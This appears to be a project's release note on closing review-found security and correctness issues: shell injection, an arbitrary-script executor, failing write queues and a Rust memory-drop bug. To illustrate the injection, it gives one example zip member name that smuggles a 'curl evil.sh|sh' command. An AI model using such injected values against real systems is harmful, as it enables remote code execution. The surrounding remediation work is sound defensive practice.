# v1.49.777 — Wave 1 Review BLOCKERs / Security + Correctness Counter-Cadence

**Released:** 2026-05-26
**Type:** counter-cadence cleanup milestone (NOT a NASA degree advance)
**Predecessor:** v1.49.776 — Template-Pollution Cleanup Counter-Cadence
**Engine state:** UNCHANGED (NASA degree sustains at 1.177; MUS / ELC / SPS / TRS SCAFFOLD-PENDING obs#60+)
**Counter-cadence parent:** v1.49.585 (first counter-cadence; concerns-cleanup); v1.49.776 (second counter-cadence)

## Summary

**Counter-cadence ship #3 in the engine.** v1.49.585 closed accumulated social-rule operational debt; v1.49.776 repaired a script-bug cascade with public-site impact; v1.49.777 closes the highest-severity findings from a multi-tier risk sweep of the entire codebase. The cadence trigger extends again: review-surfaced BLOCKERs are a productive counter-cadence trigger alongside accumulated-rule-debt and bug-cascade-with-public-impact.

**Wave 1 of the review remediation.** A full-codebase review dispatched 5 parallel risk-tier sweeps (security, correctness, performance, test quality, architecture) and ranked findings cross-tier. Four BLOCKERs surfaced: two security (`learn/acquirer.ts` shell injection × 8; `chipset/blitter/executor.ts` RCE-by-design surface) and two correctness (write-queue self-poisoning in 10 sibling JSONL stores; VRAM `PinnedBuffer::drop` UB on Drop-strategy ambiguity). All four close in this ship.

**Security fixes (2 BLOCKERs)**

- `src/learn/acquirer.ts` — replaced all 8 `execSync` sites that interpolated user-controlled paths and zip-member names into shell strings with `execFileSync(cmd, [args])`. A zip member named `x"; curl evil.sh|sh; "y` would have produced CWE-78 OS command injection on the first content extraction; the argv-array form eliminates shell parsing entirely.
- `src/chipset/blitter/executor.ts` — four hardenings on the offload executor. (1) The legacy `'custom'` scriptType is rejected at execution time (the previous path chmod 0o755'd the temp file and direct-executed it, letting attacker-controlled script payloads pick their own kernel shebang; no production caller uses 'custom'). (2) The temp file is written 0o600 — only the named interpreter executes it via argv[1]; the executable bit is not needed and the strict permission closes any TOCTOU race. (3) Child env is built from a small allowlist (PATH, HOME, LANG, LC_*, TZ, TMPDIR) plus operation.env, instead of inheriting the parent's full `process.env` — stops `ANTHROPIC_API_KEY`, `FTP_PASS`, etc. from leaking into offload scripts by default. (4) The mkdtemp directory is `rm`'d on close + error + early-throw paths; previously only the script file was unlinked, leaking the directory once per invocation (this also closes a Tier B HIGH on the same file).

**Correctness fixes (2 BLOCKERs)**

- `src/safety/write-queue.ts` (new) — adds `serializeWrite(holder, work)` and sweeps 14 sites across 10 sibling JSONL stores: `audit-logger`, `events/event-store` (3 sites), `telemetry/event-store`, `storage/pattern-store`, `calibration/calibration-store` (3 sites), `evaluator/success-tracker` (2 sites), `bundles/bundle-progress-tracker`, `learning/feedback-store`, `skill-workflows/workflow-run-store`, `testing/result-store`. The original pattern `this.writeQueue = this.writeQueue.then(work); await this.writeQueue` self-poisoned: one transient EACCES/ENOSPC turned the queue into a permanently-rejected promise, killing the store silently for the rest of the process. The helper separates two concerns — the serialization queue always resolves (errors absorbed via `.then(() => undefined, () => undefined)` so the chain stays alive), but the awaited result still carries the work's actual outcome so the caller of the failing write sees its real error, not a stale one.
- `src-tauri/src/memory_arena/vram.rs` — replaced `PinnedBuffer::drop`'s munmap-then-fallback-to-dealloc heuristic with an explicit `enum Backing { None, Mmap, Alloc }` field stamped at construction time. The previous code assumed `munmap` failure implied alloc-backed memory, but `munmap` can return non-zero for unrelated reasons (EINVAL on bad len/alignment, EAGAIN under memory pressure); calling `dealloc` on actually-mmap'd memory is UB, as is calling `munmap` on alloc'd memory. The Backing enum eliminates the ambiguity; Drop dispatches on the recorded variant.

**Verification.** 273 tests across 30 test files in the touched safety/store subsystems pass. 1445 tests across 94 test files in chipset/observation/learn/safety (touched + immediate consumers) pass. 30 VRAM-related Rust tests under `--features cuda` pass. The CLI smoke path (`skill-creator --version`, `--help`, `status`) responds correctly through the npm-global symlink.

**What this ship doesn't close.** The review surfaced 16+ HIGH findings beyond the BLOCKERs (Tauri command surface validation, dashboard 0.0.0.0 binding + CORS *, self-mod-guard fail-open on parse error, FD leaks in walk.ts + branches/commit.ts, JSON.parse defense in intelligence/kb, atlas-pg mirror pagination ORDER BY, manifest-patcher escapeRegExp, skill-index regex cache, feedback-bridge/operation-cooldown flake tests, untested .claude/hooks/ scripts, and architecture HIGHs on subsystem sprawl + duplicate Store/Registry/Manager pairs + 14 scattered disk loaders). These are queued for a Wave 2 counter-cadence ship; the full review report is captured in this session's handoff.

## Cross-track / Engine state

- **No NASA / MUS / ELC / SPS forward-cadence content this milestone** — engine remains at NASA degree 1.177 (v1.49.775 close), INTERSTELLAR-BOUNDARY axis at obs#1 first INSTANCE, MUS / ELC / SPS / TRS SCAFFOLD-PENDING.
- **No new substrate-anchors emitted** — this milestone is security/correctness operational-debt, not engine-cadence.
- **No new V-flags emitted** — the citation-debt ledger from v1.49.585 carries forward unchanged.
- **Counter-cadence cadence — third instance.** Lesson #10168 extends to its third instance, ~1 milestone after v1.49.776 (much tighter than the v585→v776 ~190-milestone gap). Tight cadence is acceptable when the trigger is operator-driven review remediation rather than passive accumulation.
- **Counter-cadence trigger class expanded again.** v585 trigger = social-rule-debt accumulation; v776 trigger = script-bug-cascade with public impact; v777 trigger = full-codebase review surfacing BLOCKERs. The cadence accommodates all three classes.

## Threads closed / opened / extended

- **CLOSED:** shell-string `execSync` antipattern in `src/learn/acquirer.ts` (8 sites). The execFileSync import was already present at line 373 for pdftotext; the unused execSync import is dropped.
- **CLOSED:** RCE-by-design surface in blitter offload executor via 'custom' scriptType + chmod 0o755. Legitimate bash/node/python interpreters preserved; `'custom'` retained in the schema enum for forward-compat but rejected at runtime.
- **CLOSED:** write-queue self-poisoning across 10 stores. Future writes against any of these stores recover from transient FS errors automatically.
- **CLOSED:** Drop-strategy UB in PinnedBuffer. Backing enum makes the deallocation path explicit and audit-friendly.
- **OPENED:** `src/safety/write-queue.ts` as the canonical serialization primitive for future per-store JSONL queues. Any new store with the same pattern should import the helper from day one.
- **OPENED:** child-process env-allowlist discipline for offload scripts. Future executor variants should inherit the same allowlist + operation.env pattern.
- **OPENED:** multi-tier risk-sweep as a reusable full-codebase review template. Five parallel agents on non-overlapping scopes, cross-tier hot-spot prioritization in the synthesis. Reusable for periodic security/correctness audits.

## Forward lessons emitted

This ship sustains and extends several disciplines:

- **Lesson #10168 (ESTABLISHED) — counter-cadence cleanup-mission cadence reuse.** Third instance; trigger class extends to include review-surfaced BLOCKERs.
- **MULTI-TIER-RISK-SWEEP-AS-FULL-REVIEW-TEMPLATE (candidate).** 5 parallel agents on security/correctness/performance/tests/architecture scopes; cross-tier synthesis surfaces highest-leverage fixes (e.g. blitter/executor.ts appeared in both security and correctness tiers). obs#1 NEW.
- **DEFENSE-IN-DEPTH-OVER-REMOVAL (candidate).** Blitter disposition chose to harden the executor (drop 'custom' + chmod + env allowlist + temp leak fix) rather than rip out the legit bash/node/python paths consumers depend on. Surface preserved, attack vectors closed. obs#1 NEW.
- **SHARED-HELPER-EXTRACTION-FROM-COPYPASTA (sustained).** The write-queue sweep matched the earlier session's pattern of extracting `isCliEntrypoint` into `src/cli/entrypoint-guard.ts` and applying across 4 call sites. Counter-pattern to Tier E's "85 Store/Registry/Manager classes" sprawl finding. obs#2 cumulative.
- **CROSS-TIER-HOT-SPOT-PRIORITIZATION (candidate).** When two parallel-dispatched review tiers agree on the same file, that file moves to the top of the fix queue — both because the leverage is highest (one fix satisfies two tiers) and because the agreement is independent corroboration. blitter/executor.ts qualified at v1.49.777. obs#1 NEW.

## Tooling added / modified

| File | Status | Purpose |
|------|--------|---------|
| `src/safety/write-queue.ts` | new | `serializeWrite(holder, work)` — shared queue helper that doesn't self-poison on rejection. |
| `src/safety/write-queue.test.ts` | new | 3 focused tests including the regression proof: first call rejects, second call must succeed. |
| `src/learn/acquirer.ts` | modified | 8 execSync → execFileSync swaps; dropped unused execSync import. |
| `src/chipset/blitter/executor.ts` | modified | Reject 'custom' scriptType, drop chmod 0o755, env allowlist, plug temp-dir leak. |
| `src/safety/audit-logger.ts` | modified | Use serializeWrite. |
| `src/events/event-store.ts` | modified | Use serializeWrite (3 sites). |
| `src/telemetry/event-store.ts` | modified | Use serializeWrite. |
| `src/storage/pattern-store.ts` | modified | Use serializeWrite. |
| `src/calibration/calibration-store.ts` | modified | Use serializeWrite (3 sites). |
| `src/evaluator/success-tracker.ts` | modified | Use serializeWrite (2 sites). |
| `src/bundles/bundle-progress-tracker.ts` | modified | Use serializeWrite. |
| `src/learning/feedback-store.ts` | modified | Use serializeWrite. |
| `src/skill-workflows/workflow-run-store.ts` | modified | Use serializeWrite. |
| `src/testing/result-store.ts` | modified | Use serializeWrite. |
| `src-tauri/src/memory_arena/vram.rs` | modified | Add `enum Backing` field on `PinnedBuffer`; dispatch in Drop. |

## Files reviewed but not changed this ship

Wave 2 candidates (review HIGHs queued for next counter-cadence):

- Tauri command surface: `src-tauri/src/commands/{pty,dashboard}.rs` — input validation + JS-source escape
- Dashboard server: `scripts/serve-dashboard.mjs`, `src/console/helper.ts` — bind 127.0.0.1, origin allowlist
- Self-mod hooks: `project-claude/hooks/{self-mod-guard,git-add-blocker}.js` — switch fail-open to fail-closed on parse error
- CSP: `src-tauri/tauri.conf.json` — add `app.security.csp` block
- FD leaks: `src/intelligence/analyzer/walk.ts:164-189`, `src/branches/commit.ts:157-164` — try/finally close
- JSON.parse defense: `src/intelligence/kb/{snapshots,meetings}.ts` — route through validated helpers
- Performance HIGHs: `src/storage/skill-index.ts:224-243` regex cache, VRAM `read_to_end` pre-sizing
- Test quality HIGHs: `src/observation/feedback-bridge.test.ts`, `src/safety/operation-cooldown.test.ts` — fake-timer fix

## T14 ship-sequence notes

Per `docs/T14-SHIP-SEQUENCE.md` canonical ordering. No amendments this ship — the v776 amendments (live-page WebFetch, pre-dispatch contamination audit, backup-before-bulk-transform) sustain forward but do not apply to v777 since there is no FTP sync or bulk-transform step in this ship.

## Thread state

CHAIN-CONVENTIONS sustains. NASA degree sustains at 1.177. Counter-cadence as a cadence (Lesson #10168) extends to its third instance, trigger class accommodating review-surfaced BLOCKERs.

---
**Prev:** [v1.49.776](../v1.49.776/README.md) · **Next:** v1.49.778+
